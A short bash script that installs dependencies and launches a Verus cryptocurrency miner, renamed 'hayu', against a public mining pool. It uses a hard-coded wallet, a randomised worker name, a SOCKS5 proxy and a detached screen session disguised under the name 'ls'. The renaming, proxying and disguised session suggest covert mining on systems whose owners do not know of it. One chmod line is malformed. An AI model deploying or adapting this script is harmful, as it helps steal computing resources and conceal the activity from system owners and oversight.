#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x udin.sh && chmod +x hayu chmod 777 hayu udin.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RT8DNmxnDDRCLScadn7efqKuDLFvrB9unv
WORKER=$(echo $(shuf -i 1-10 -n 1)ojann)
PROXY=socks5://104.255.170.70:50580		
./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
